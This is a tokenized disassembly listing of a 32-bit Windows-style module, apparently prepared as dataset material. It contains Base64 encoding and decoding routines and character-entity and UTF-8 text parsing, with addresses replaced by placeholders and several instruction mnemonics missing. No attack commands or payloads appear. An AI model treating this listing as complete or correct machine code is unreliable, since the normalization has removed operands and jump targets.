sub_10001000
push esi
push edi
push 0x7200
call sub_10009010
mov edx [ esp + 0x10 ]
mov edi eax
mov [ rw-data ] edi
add esp 0x4
lea eax [ edx + edx * 8 ]
lea eax [ edx + eax * 2 ]
lea ecx [ eax + eax * 2 ]
xor eax eax
shl ecx 0x3
mov esi ecx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
mov ecx [ rw-data ]
xor eax eax
pop edi
cmp ecx eax
mov [ rw-data ] eax
pop esi
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax 0x1
retn
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_10001090
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
jne r-xdata
push edi
call sub_10001280
mov ebx [ rw-data ]
mov ecx [ rw-data ]
mov ebp [ esp + 0x24 ]
add esp 0x4
cmp ebx ecx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
push edi
call sub_10001210
lea eax [ ebx + ebx * 8 ]
mov ecx [ rw-data ]
add esp 0x4
lea eax [ ebx + eax * 2 ]
lea edx [ eax + eax * 2 ]
xor eax eax
shl edx 0x3
lea esi [ edx + ecx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x14 ] esi
mov eax ecx
mov esi edi
mov edi [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ edx + ecx + 0x1c4 ] ebp
cmp eax 0xffffffff
mov ebx eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
mov ecx [ rw-data ]
lea edx [ ebx + ebx * 8 ]
lea eax [ ebx + edx * 2 ]
lea eax [ eax + eax * 2 ]
lea edx [ ecx + eax * 8 + 0x100 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
lea ecx [ ebx + ebx * 8 ]
pop edi
pop esi
lea eax [ ebx + ecx * 2 ]
lea edx [ eax + eax * 2 ]
mov eax [ rw-data ]
mov ecx [ eax + edx * 8 + 0x1c4 ]
lea eax [ eax + edx * 8 + 0x1c4 ]
or ecx ebp
pop ebp
mov [ eax ] ecx
mov eax 0x1
pop ebx
retn
lea ecx [ ebx + ebx * 8 ]
lea eax [ ebx + ecx * 2 ]
or ecx 0xffffffff
lea edx [ eax + eax * 2 ]
mov eax [ rw-data ]
lea edx [ eax + edx * 8 + 0x184 ]
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_100011d0
mov eax [ esp + 0x4 ]
push eax
call sub_10001280
add esp 0x4
cmp eax 0xffffffff
je r-xdata
xor edx edx
cmp eax 0xffffffff
setne dl
mov eax edx
retn
lea ecx [ eax + eax * 8 ]
push esi
push edi
mov edi [ esp + 0x10 ]
lea ecx [ eax + ecx * 2 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ rw-data ]
lea esi [ ecx + edx * 8 ]
mov ecx 0x72
[ edi ] [ esi ]
pop edi
pop esi
sub_10001210
mov eax [ esp + 0x4 ]
push edi
test eax eax
jne r-xdata
push 0x40
push eax
call sub_10009040
mov edi eax
add esp 0x8
inc edi
jne r-xdata
pop edi
retn
push edi
call sub_100012e0
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
pop edi
retn
mov eax 0x1
pop edi
retn
mov edx [ rw-data ]
push ebx
mov ebx edx
or ecx eax
shl ebx 0x8
xor eax eax
add ebx rw-data
[ edi ]
not ecx
sub edi ecx
push esi
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
inc edx
[ edi ] [ esi ]
pop esi
mov [ rw-data ] edx
pop ebx
sub_10001280
mov eax [ rw-data ]
push ebx
push esi
push edi
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
mov ebx [ esp + 0x10 ]
xor esi esi
cmp edi [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
inc edi
add esi 0x1c8
cmp edi eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
lea ecx [ esi + eax ]
push ecx
push ebx
call sub_10009100
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
sub_100012e0
push ebx
mov ebx [ esp + 0x8 ]
push esi
xor esi esi
test ebx ebx
jne r-xdata
mov eax [ rw-data ]
push edi
test eax eax
je r-xdata
pop esi
or eax 0xffffffff
pop ebx
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
mov edi rw-data
cmp esi [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
inc esi
add edi 0x100
cmp esi eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push edi
push ebx
call sub_10009100
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
sub_10001340
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax 0xaaaaaaab
lea edx [ ecx * 4 + 0xb ]
mul edx
mov eax [ esp + 0x18 ]
shr edx 0x3
shl edx 0x2
cmp eax edx
jb r-xdata
mov eax [ esp + 0x1c ]
push ebx
test ecx ecx
mov [ eax ] edx
push ebp
mov eax edi
jbe r-xdata
pop ebp
pop ebx
mov [ esi ] 0x0
pop edi
mov eax 0x1
pop esi
retn
mov ebp 0xfffffffe
sub ebp edi
mov [ esp + 0x14 ] ebp
jmp r-xdata
xor edx edx
add ebp 0x2
mov dl [ eax ]
mov edi ecx
shr edx 0x2
sub edi ebp
mov dl [ edx + rw-data ]
sub edi eax
cmp edi 0x1
mov [ esi ] dl
je r-xdata
mov al [ eax ]
pop ebp
and eax 0x3
pop ebx
shl eax 0x4
add esi 0x4
pop edi
mov cl [ eax + rw-data ]
mov al 0x3d
mov [ esi - 0x3 ] cl
mov [ esi - 0x2 ] al
mov [ esi - 0x1 ] al
mov [ esi ] 0x0
mov eax 0x1
pop esi
retn
mov dl [ eax ]
xor ebx ebx
mov bl [ eax + 0x1 ]
and edx 0x3
shl edx 0x4
shr ebx 0x4
or edx ebx
cmp edi 0x2
mov dl [ edx + rw-data ]
mov [ esi + 0x1 ] dl
mov dl [ eax + 0x1 ]
je r-xdata
and edx 0xf
add esi 0x4
mov al [ edx * 4 + rw-data ]
mov [ esi - 0x1 ] 0x3d
mov [ esi - 0x2 ] al
xor ebx ebx
and edx 0xf
mov bl [ eax + 0x2 ]
add eax 0x3
shl edx 0x2
shr ebx 0x6
or edx ebx
add ebp eax
add esi 0x4
mov dl [ edx + rw-data ]
mov [ esi - 0x2 ] dl
mov dl [ eax - 0x1 ]
and edx 0x3f
cmp ebp ecx
mov dl [ edx + rw-data ]
mov [ esi - 0x1 ] dl
jb r-xdata
mov ebp [ esp + 0x14 ]
pop ebp
pop ebx
mov [ esi ] 0x0
pop edi
mov eax 0x1
pop esi
retn
sub_10001480
mov al [ esp + 0x4 ]
cmp al 0x41
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jg r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x7a
jg r-xdata
sub eax 0x41
retn
cmp al 0x2b
jne r-xdata
cmp al 0x39
jg r-xdata
sub eax 0x47
retn
cmp al 0x2f
jne r-xdata
mov al 0x3e
retn
add eax 0x4
retn
cmp al 0x3d
setne al
dec eax
and al 0x41
add eax 0xff
retn
mov al 0x3f
retn
sub_100014d0
mov ecx [ esp + 0x4 ]
push ebx
push ebp
push esi
test ecx ecx
push edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov edx [ esp + 0x18 ]
test dl 0x3
jne r-xdata
mov edi [ esp + 0x20 ]
mov eax edx
shr eax 0x2
lea eax [ eax + eax * 2 ]
cmp edi eax
jb r-xdata
mov edi [ esp + 0x24 ]
test edx edx
mov [ edi ] eax
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp 0xfffffffe
lea edi [ esi + 0x2 ]
lea esi [ ecx + 0x2 ]
sub ebp ecx
cmp dl 0x40
je r-xdata
mov cl [ esp + 0x1c ]
cmp cl 0xff
je r-xdata
cmp cl 0x40
je r-xdata
cmp bl 0xff
je r-xdata
cmp al 0xff
je r-xdata
mov al cl
shr al 0x4
shl dl 0x2
or al dl
cmp bl 0x40
mov [ edi - 0x2 ] al
je r-xdata
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov ecx [ eax ]
pop ebx
add ecx 0xfffffffe
mov [ eax ] ecx
mov eax 0x1
retn
mov al [ esp + 0x20 ]
mov dl bl
shr dl 0x2
shl cl 0x4
or dl cl
cmp al 0x40
mov [ edi - 0x1 ] dl
je r-xdata
mov eax [ esp + 0x24 ]
dec [ eax ]
mov ecx [ esp + 0x18 ]
add esi 0x4
shl bl 0x6
or bl al
lea eax [ esi + ebp ]
mov [ edi ] bl
add edi 0x3
cmp eax ecx
jb r-xdata
mov al [ esi - 0x2 ]
push eax
call sub_10001480
mov cl [ esi - 0x1 ]
mov [ esp + 0x18 ] al
push ecx
call sub_10001480
mov dl [ esi ]
mov [ esp + 0x24 ] al
push edx
call sub_10001480
mov bl al
mov al [ esi + 0x1 ]
push eax
call sub_10001480
mov dl [ esp + 0x24 ]
add esp 0x10
cmp dl 0xff
mov [ esp + 0x20 ] al
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
sub_10001610
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ eax + 0x1c ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x18 ]
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov edi [ edi + 0x14 ]
test edi edi
jne r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov bl [ esi + 0x1 ]
mov dl al
cmp al bl
jne r-xdata
mov esi [ edi ]
mov ecx ebp
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov al [ ecx ]
mov bl [ esi ]
mov dl al
cmp al bl
jne r-xdata
sub_100016a0
push esi
mov esi [ esp + 0xc ]
add esi 0x4
push edi
mov eax [ esi - 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
retn
cmp [ eax ] 0x0
je r-xdata
mov edi [ esi ]
push eax
mov eax [ esp + 0x10 ]
add esi 0x4
push eax
call sub_10001610
add esp 0x8
test edi edi
jge r-xdata
push esi
push edi
push eax
call sub_10001680
add esp 0x8
push eax
call sub_100016a0
add esp 0x8
pop edi
pop esi
retn
pop edi
pop esi
retn
sub_10001710
mov edx [ esp + 0x8 ]
sub esp 0x80
mov ecx 0x1
push esi
mov esi [ esp + 0x88 ]
mov eax [ esi + 0x38 ]
cmp eax edx
jae r-xdata
mov eax [ esp + 0x90 ]
push eax
push ecx
push rw-data
lea ecx [ esp + 0x10 ]
push 0x80
push ecx
call sub_10009220
lea edx [ esp + 0xa8 ]
lea eax [ esp + 0x18 ]
push edx
push eax
lea ecx [ esi + 0x4e ]
push 0x80
push ecx
call sub_100091d0
add esp 0x24
mov eax esi
pop esi
add esp 0x80
retn
cmp [ eax ] 0xa
jne r-xdata
inc eax
cmp eax edx
jb r-xdata
inc ecx
sub_10001780
sub esp 0x10
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
mov [ esp + 0x24 ] esi
mov [ esp + 0x18 ] esi
mov bl [ esp + 0x2c ]
cmp al 0x26
je r-xdata
mov eax [ esp + 0x24 ]
cmp bl 0x2a
jne r-xdata
cmp bl 0x63
je r-xdata
mov bl [ esp + 0x2c ]
cmp al 0x25
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov cl [ eax ]
mov esi eax
test cl cl
je r-xdata
mov al [ esi ]
cmp al 0x26
jne r-xdata
push 0x2
push rw-data
push esi
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
test al 0x80
jne r-xdata
cmp bl 0x25
je r-xdata
dec esi
cmp esi eax
jb r-xdata
push rw-data
push esi
call sub_10009280
add esp 0x8
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
cmp bl al
je r-xdata
mov cl [ esi + 0x2 ]
lea eax [ esi + 0x2 ]
cmp cl 0x78
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x20
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
lea edx [ eax + esi ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
push ecx
push edx
push esi
call sub_10009830
add esp 0xc
cmp bl 0x20
je r-xdata
cmp bl al
jne r-xdata
mov ebx [ esp + 0x28 ]
xor eax eax
mov [ esp + 0x10 ] eax
cmp [ ebx ] 0x0
je r-xdata
cmp bl 0x20
je r-xdata
lea edx [ esp + 0x14 ]
push 0xa
push edx
push eax
lea eax [ esp + 0x14 ]
push 0x10
lea ecx [ esi + 0x3 ]
push eax
push ecx
jmp r-xdata
mov edx [ rw-data ]
movsx ecx al
mov al [ edx + ecx * 2 ]
and eax 0x8
movsx eax al
push 0x8
push eax
call sub_10009dc8
add esp 0x8
jmp r-xdata
mov [ esi ] 0x0
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
cmp al 0x20
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp bl 0x2a
jne r-xdata
mov ecx [ ebx + eax * 4 ]
inc eax
test ecx ecx
mov [ esp + 0x10 ] eax
je r-xdata
mov eax ebx
mov ebp ebx
cmp bl 0x2a
je r-xdata
inc esi
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0x3b
jne r-xdata
call sub_10009b65
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
movsx edx al
mov eax [ rw-data ]
mov al [ eax + edx * 2 ]
and eax 0x8
movsx ecx al
push 0x8
push ecx
call sub_10009dc8
add esp 0x8
jmp r-xdata
mov edi [ ebx + eax * 4 ]
or ecx 0xffffffff
xor eax eax
push 0x3b
[ edi ]
not ecx
dec ecx
push esi
mov ebp ecx
call sub_10009040
mov edx eax
sub eax esi
lea ecx [ ebp - 0x1 ]
add esp 0x8
cmp ecx eax
mov [ esp + 0x14 ] edx
jle r-xdata
mov eax [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
mov ecx [ ebp + 0x8 ]
add ebp 0x8
add edi 0x2
test ecx ecx
mov [ esp + 0x10 ] edi
mov eax ebp
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp ebx 0x80
jge r-xdata
mov [ esi ] 0x20
test eax eax
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
inc edx
push ecx
lea ecx [ esi + ebp ]
push edx
push ecx
call sub_10009830
mov edx [ esp + 0x1c ]
push ebp
mov eax [ ebx + edx * 4 ]
push eax
push esi
call sub_100092c0
add esp 0x18
jmp r-xdata
mov ebx [ esp + 0x24 ]
mov edi edx
or ecx 0xffffffff
xor eax eax
sub esi ebx
[ edi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] esi
not ecx
dec ecx
add ecx esi
add ecx ebp
cmp ebx eax
push ecx
jne r-xdata
mov edx [ eax ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esi + 0x1 ]
push ecx
push edx
push eax
call sub_10009d90
add esp 0xc
test eax eax
je r-xdata
xor ecx ecx
mov eax ebx
mov [ esi ] bl
inc esi
jmp r-xdata
push ebx
call sub_100093be
add esp 0x8
mov [ esp + 0x24 ] eax
call sub_100096ed
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esp + 0x24 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x1c ]
jmp r-xdata
cdq
sub eax edx
inc ecx
sar eax 0x1
jne r-xdata
add ecx 0xfffffffe
mov eax 0x66666667
imul ecx
sar edx 0x1
mov ecx edx
mov eax ebx
shr ecx 0x1f
add edx ecx
mov ecx 0x7
mov edi edx
or dl 0xff
sub ecx edi
lea ebp [ edi + edi * 2 ]
shl ebp 0x1
shl dl cl
mov ecx ebp
sar eax cl
or dl al
mov [ esi ] dl
inc esi
test edi edi
je r-xdata
push 0x3b
push esi
call sub_10009040
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
push ecx
push 0x3b
push esi
call sub_10009040
add esp 0x8
inc eax
push eax
push esi
call sub_10009830
add esp 0xc
jmp r-xdata
mov eax [ esp + 0x24 ]
push 0x3b
add esi eax
push esi
call sub_10009040
mov ebx [ esp + 0x30 ]
mov edx eax
add esp 0x8
mov [ esp + 0x14 ] edx
sub ebp 0x6
mov edx ebx
mov ecx ebp
sar edx cl
and dl 0x3f
or dl 0x80
mov [ esi ] dl
inc esi
dec edi
jne r-xdata
sub_10001af0
push esi
mov esi [ esp + 0x8 ]
mov edx [ esi + 0x28 ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
mov [ esi + 0x28 ] edx
pop esi
retn
push edi
mov edi [ edx + 0x8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x10 ]
not ecx
dec ecx
push ecx
push eax
push edx
call sub_100034e0
mov ecx [ esp + 0x20 ]
add esp 0xc
mov [ eax + 0x4 ] ecx
mov [ esi + 0x28 ] eax
pop edi
pop esi
retn
sub_10001b40
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
push ebx
mov [ esp + 0x8 ] eax
mov ebx [ ecx + 0x28 ]
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
push ebp
mov [ eax + edx ] 0x0
mov edx [ esp + 0x18 ]
mov ecx [ ecx + 0x40 ]
push esi
push edi
push edx
push ecx
push eax
call sub_10001780
mov ebp eax
or ecx 0xffffffff
mov edi ebp
xor eax eax
add esp 0xc
mov esi [ ebx + 0x8 ]
[ edi ]
mov al [ esi ]
not ecx
dec ecx
mov edx ecx
inc edx
test al al
jne r-xdata
mov al [ ebx + 0x24 ]
mov edi esi
test al 0x40
je r-xdata
mov [ ebx + 0x8 ] ebp
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x1c ] ecx
add ecx edx
push ecx
call sub_100096ed
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
mov eax edx
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
add edx edi
push edx
push esi
call sub_100093be
add esp 0x8
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ebx + 0x8 ]
pop edi
pop esi
cmp eax ecx
pop ebp
je r-xdata
push ebp
call sub_10009e3d
add esp 0x4
mov [ ebx + 0x8 ] eax
lea edx [ eax + edi ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x14 ]
and ecx 0x3
cmp ebp eax
[ edi ] [ esi ]
je r-xdata
push 0x40
push ebx
call sub_10003530
add esp 0x8
sub_10001c60
mov edx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x28 ]
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
push edx
push rw-data
push ecx
push ebp
call sub_10001710
add esp 0x10
pop edi
pop esi
pop ebp
retn
mov esi [ edi ]
test esi esi
je r-xdata
push ebx
mov eax edx
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ edi + 0x20 ]
pop edi
mov [ ebp + 0x28 ] eax
pop esi
xor eax eax
pop ebp
retn
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
test eax eax
pop ebx
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_10001cd0
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
inc eax
push esi
push edi
mov [ esp + 0x10 ] eax
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
cmp al 0x26
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
inc ecx
inc eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x10 ] eax
jmp r-xdata
test al al
je r-xdata
mov ecx [ esp + 0x1c ]
mov al [ ecx ]
test al al
je r-xdata
mov esi [ esp + 0x18 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
mov edx [ esp + 0x10 ]
not ecx
dec ecx
push ecx
push esi
push edx
call sub_10009d90
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ ebp ]
xor ebx ebx
test eax eax
je r-xdata
cmp [ ebp + ebx * 4 ] 0x0
je r-xdata
mov eax ebp
mov esi ebp
mov ecx [ ebp + ebx * 4 + 0x4 ]
push ebp
push ecx
push esi
call sub_10001cd0
add esp 0xc
test eax eax
je r-xdata
mov esi [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
add esi 0x8
add ebx 0x2
mov eax esi
test ecx ecx
jne r-xdata
mov edx [ eax ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
mov eax [ esp + 0x10 ]
not ecx
dec ecx
push ecx
push eax
push edx
call sub_10009d90
add esp 0xc
test eax eax
je r-xdata
sub_10001db0
sub esp 0x8
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
xor ebx ebx
mov ebp esi
push rw-data
push esi
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x1c ] ebp
mov [ esi + eax ] bl
call sub_10009fe0
add esi eax
add esp 0x8
mov [ esp + 0x20 ] esi
cmp [ esi ] 0x0
je r-xdata
mov edi rw-data
lea ecx [ esi + 0x1 ]
push rw-data
push ecx
mov [ esi ] bl
call sub_10009280
lea edx [ esi + eax + 0x1 ]
add esp 0x8
mov [ esp + 0x20 ] edx
mov esi edx
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
mov ebp [ esp + 0x1c ]
mov eax [ ebp + 0x48 ]
cmp [ eax ] 0x0
jne r-xdata
push rw-data
push esi
call sub_10009f60
mov esi eax
add esp 0x8
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ ebp + 0x1 ]
mov cl [ edi + 0x1 ]
mov al dl
cmp dl cl
jne r-xdata
mov edi [ ebp + 0x48 ]
mov eax [ edi ]
test eax eax
je r-xdata
push 0x4
call sub_100096ed
mov [ ebp + 0x48 ] eax
add esp 0x4
mov [ eax ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x3
push rw-data
lea eax [ esi + 0xa ]
push rw-data
push eax
call sub_10009280
add esp 0x8
lea ecx [ eax + esi + 0xa ]
push ecx
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add ebp 0x2
add edi 0x2
test al al
jne r-xdata
mov eax [ ebp + 0x48 ]
xor esi esi
cmp [ eax + ebx * 4 ] esi
jne r-xdata
mov esi [ eax ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
pop edi
pop esi
pop ebp
mov [ edx + 0x4c ] 0x1
pop ebx
add esp 0x8
retn
mov cl [ ebp ]
mov dl [ edi ]
mov al cl
cmp cl dl
jne r-xdata
mov eax [ ebp + 0x48 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ecx + 0x4 ]
lea eax [ ecx + 0x4 ]
cmp edx esi
je r-xdata
lea ecx [ ebx * 4 + 0x8 ]
push ecx
push eax
call sub_100093be
push 0xc
mov [ ebp + 0x48 ] eax
call sub_100096ed
mov edx [ ebp + 0x48 ]
push rw-data
mov [ edx + ebx * 4 ] eax
mov eax [ ebp + 0x48 ]
mov edx [ esp + 0x24 ]
mov ecx [ eax + ebx * 4 ]
mov [ ecx ] edx
mov eax [ ebp + 0x48 ]
mov [ eax + ebx * 4 + 0x4 ] esi
mov ecx [ ebp + 0x48 ]
mov edx [ ecx + ebx * 4 ]
mov [ edx + 0x4 ] esi
call sub_10009f26
mov ecx [ ebp + 0x48 ]
add esp 0x10
mov edx [ ecx + ebx * 4 ]
mov [ edx + 0x8 ] eax
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ esp + 0x10 ]
lea edx [ esi * 4 + 0xc ]
push edx
push ecx
call sub_100093be
mov ecx [ ebp + 0x48 ]
mov [ ecx + ebx * 4 ] eax
mov edx [ ebp + 0x48 ]
lea eax [ esi + 0x1 ]
mov ecx [ edx + ebx * 4 ]
push eax
mov edx [ ecx + eax * 4 ]
push edx
call sub_100093be
mov ecx [ ebp + 0x48 ]
add esp 0x10
mov edi rw-data
mov edx [ ecx + ebx * 4 ]
mov [ edx + esi * 4 + 0x8 ] eax
mov eax [ ebp ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
add eax 0x4
inc edx
mov [ esp + 0x10 ] edx
mov edx [ eax ]
cmp edx esi
jne r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
inc ebx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ ebp + 0x48 ]
mov ecx [ eax + ebx * 4 ]
xor eax eax
mov edx [ ecx + esi * 4 + 0x8 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ edx + esi - 0x1 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx 0x3
inc eax
[ edi ] [ esi ]
mov ecx [ ebp + 0x48 ]
mov edx [ ecx + ebx * 4 ]
mov [ edx + eax * 4 ] 0x0
mov ecx [ ebp + 0x48 ]
mov eax [ esp + 0x20 ]
mov edx [ ecx + ebx * 4 ]
mov ecx [ esp + 0x10 ]
mov [ edx + ecx * 4 ] eax
mov edi rw-data
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10002020
sub esp 0xc
push ebx
push ebp
push esi
push edi
push 0x4
mov [ esp + 0x14 ] 0x0
call sub_100096ed
mov ecx [ rw-data ]
mov esi [ esp + 0x28 ]
mov edx [ esp + 0x2c ]
mov edi [ esp + 0x24 ]
add esp 0x4
mov [ eax ] ecx
test esi esi
mov [ esp + 0x14 ] eax
mov [ esi + edx ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_10009e3d
mov cl [ edi + 0x4e ]
add esp 0x4
xor eax eax
pop edi
pop esi
test cl cl
pop ebp
pop ebx
sete al
add esp 0xc
retn
mov al [ esi ]
test al al
je r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3c
je r-xdata
push 0x8
push rw-data
push esi
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
cmp al 0x25
je r-xdata
push 0x9
push rw-data
push esi
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esi + 0x8 ]
push rw-data
push eax
call sub_10009280
lea esi [ esi + eax + 0x8 ]
push rw-data
mov edi esi
push esi
mov [ esp + 0x38 ] edi
call sub_10009280
mov ebx eax
push rw-data
add ebx esi
push ebx
mov [ esp + 0x28 ] ebx
call sub_10009fe0
mov esi eax
push rw-data
add esi ebx
lea eax [ esi + 0x1 ]
mov [ esi ] 0x3b
push eax
mov [ esp + 0x38 ] eax
call sub_10009280
lea ebp [ eax + esi + 0x1 ]
add esp 0x20
mov al [ ebp ]
